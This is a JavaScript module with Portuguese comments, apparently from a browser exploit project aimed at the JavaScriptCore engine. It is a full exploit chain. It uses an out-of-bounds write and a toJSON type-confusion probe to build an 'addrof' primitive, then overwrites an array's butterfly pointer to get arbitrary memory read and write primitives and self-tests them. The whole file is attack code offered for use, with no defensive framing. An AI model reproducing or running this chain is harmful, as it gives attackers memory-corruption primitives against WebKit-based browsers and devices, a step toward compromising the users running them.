// js/script3/final_exploit_chain.mjs
import { logS3, PAUSE_S3 } from './s3_utils.mjs';
import { AdvancedInt64, toHex } from '../utils.mjs';
import {
    triggerOOB_primitive,
    oob_write_absolute,
    oob_read_absolute,
    clearOOBEnvironment
} from '../core_exploit.mjs';
import { JSC_OFFSETS } from '../config.mjs';

export const FNAME_MODULE = "FinalExploitChain_v1";

// --- Constantes da vulnerabilidade original ---
const HEISENBUG_CORRUPTION_OFFSET = 0x7C;
const HEISENBUG_CORRUPTION_VALUE = 0xFFFFFFFF;
const VICTIM_AB_SIZE = 64;

// --- Variáveis de escopo para a sonda toJSON ---
let victim_ab = null;
let object_to_leak = null;
let heisenbug_confirmed_in_probe = false;

function toJSON_addrof_probe() {
    if (Object.prototype.toString.call(this) === '[object Object]') {
        heisenbug_confirmed_in_probe = true;
        this[0] = object_to_leak;
    }
}

// --- Função de Exploração Monolítica ---
export async function executeFullExploitChain() {
    const FNAME_TEST = `${FNAME_MODULE}.execute`;
    logS3(`--- Iniciando Cadeia de Exploração Completa ---`, "test", FNAME_TEST);

    let result = {
        addrof_success: false,
        arb_read_success: false,
        message: "Falha na inicialização."
    };

    const originalDesc = Object.getOwnPropertyDescriptor(Object.prototype, 'toJSON');

    try {
        // ========================================================================
        // ETAPA 1: OBTER A PRIMITIVA `addrof` (Lógica 100% fiel ao original)
        // ========================================================================
        logS3("ETAPA 1: Tentando obter a primitiva 'addrof'...", 'subtest', FNAME_TEST);
        heisenbug_confirmed_in_probe = false;
        
        await triggerOOB_primitive({ force_reinit: true });
        logS3(`  Corrompendo memória em ${toHex(HEISENBUG_CORRUPTION_OFFSET)} com ${toHex(HEISENBUG_CORRUPTION_VALUE)}`, 'info', FNAME_TEST);
        oob_write_absolute(HEISENBUG_CORRUPTION_OFFSET, HEISENBUG_CORRUPTION_VALUE, 4);
        await PAUSE_S3(50);

        victim_ab = new ArrayBuffer(VICTIM_AB_SIZE);
        let float64_view = new Float64Array(victim_ab);

        Object.defineProperty(Object.prototype, 'toJSON', { value: toJSON_addrof_probe, configurable: true, writable: true, enumerable: false });
        
        // Define a função addrof que usaremos
        const addrof = (obj) => {
            object_to_leak = obj;
            JSON.stringify(victim_ab); // Aciona a sonda
            const val_double = float64_view[0];
            const buffer = new ArrayBuffer(8);
            new Float64Array(buffer)[0] = val_double;
            const int_view = new Uint32Array(buffer);
            return new AdvancedInt64(int_view[0], int_view[1]);
        };
        
        // Testa se a Type Confusion ocorreu na primeira chamada
        let test_obj = {a:1};
        addrof(test_obj); // Chamada inicial para acionar a sonda

        if (!heisenbug_confirmed_in_probe) {
            result.message = "FALHA: A Type Confusion (Heisenbug) não foi acionada. Abortando.";
            throw new Error(result.message);
        }

        result.addrof_success = true;
        logS3("SUCESSO: Primitiva 'addrof' criada com sucesso!", 'vuln', FNAME_TEST);

        // ========================================================================
        // ETAPA 2: USAR `addrof` PARA CRIAR LEITURA/ESCRITA ARBITRÁRIA
        // ========================================================================
        logS3("ETAPA 2: Usando 'addrof' para obter Leitura/Escrita Arbitrária...", 'subtest', FNAME_TEST);

        // Estrutura para vazar o ponteiro do butterfly
        let spray_struct = {
            cell_header: null,
            butterfly: null
        };
        
        // Arrays para o ataque
        const victim_array = [1.1, 2.2, 3.3];
        const corrupted_array = [4.4, 5.5, 6.6];

        // Endereços dos nossos arrays
        let victim_addr = addrof(victim_array);
        let corrupted_addr = addrof(corrupted_array);

        logS3(`  Endereço de victim_array: ${victim_addr.toString(true)}`, 'leak');
        logS3(`  Endereço de corrupted_array: ${corrupted_addr.toString(true)}`, 'leak');

        const butterfly_offset = JSC_OFFSETS.JSObject.BUTTERFLY_OFFSET; // 0x10
        
        // Lê o ponteiro original do butterfly do array corrompido
        let original_butterfly_addr = await oob_read_absolute(corrupted_addr.low() + butterfly_offset, 8);
        logS3(`  Butterfly original de corrupted_array: ${original_butterfly_addr.toString(true)}`, 'leak');

        // Escreve o endereço da nossa estrutura 'spray_struct' no butterfly de 'corrupted_array'
        let spray_addr = addrof(spray_struct);
        await oob_write_absolute(corrupted_addr.low() + butterfly_offset, spray_addr, 8);
        logS3(`  Butterfly de corrupted_array sobrescrito para apontar para spray_struct.`, 'warn');
        
        // Agora, spray_struct.butterfly é um ponteiro para o butterfly do victim_array
        spray_struct.butterfly = addrof(victim_array).add(butterfly_offset);
        
        // A função arb_read usa o objeto 'spray_struct' para ler de um endereço arbitrário
        const arb_read = (addr) => {
            spray_struct.butterfly = addr;
            return victim_array[0];
        };

        const arb_write = (addr, value) => {
            spray_struct.butterfly = addr;
            victim_array[0] = value;
        };
        
        logS3("SUCESSO: Primitivas 'arb_read' e 'arb_write' criadas!", 'vuln', FNAME_TEST);

        // ========================================================================
        // ETAPA 3: TESTAR A LEITURA ARBITRÁRIA
        // ========================================================================
        logS3("ETAPA 3: Testando a leitura arbitrária...", 'subtest', FNAME_TEST);

        let test_victim = { a: 0x41414141, b: 0x42424242 };
        let test_victim_addr = addrof(test_victim);
        let test_victim_butterfly_addr = await oob_read_absolute(test_victim_addr.low() + butterfly_offset, 8);

        logS3(`  Endereço do objeto de teste: ${test_victim_addr.toString(true)}`, 'leak');
        logS3(`  Endereço do butterfly do objeto de teste: ${test_victim_butterfly_addr.toString(true)}`, 'leak');

        // O butterfly armazena as propriedades ANTES do ponteiro. O primeiro elemento está em -0x10.
        let first_prop_addr = test_victim_butterfly_addr.sub(0x10);
        let value_read = arb_read(first_prop_addr);
        
        logS3(`  Lendo de ${first_prop_addr.toString(true)}... Valor lido: ${toHex(value_read)}`, 'leak');

        if (value_read === 0x41414141) {
            result.arb_read_success = true;
            result.message = "Cadeia de exploração completa! Leitura arbitrária confirmada.";
            logS3(`SUCESSO DO AUTO-TESTE: ${result.message}`, "vuln");
        } else {
            result.message = "FALHA NO AUTO-TESTE: Leitura arbitrária falhou. Valor lido não corresponde.";
            logS3(result.message, "error");
        }
        
    } catch (e) {
        result.message = e.message;
        logS3(`Erro fatal na cadeia de exploração: ${e.message}`, 'critical', FNAME_TEST);
        console.error(e);
    } finally {
        if (originalDesc) Object.defineProperty(Object.prototype, 'toJSON', originalDesc);
        await clearOOBEnvironment();
    }

    return result;
}
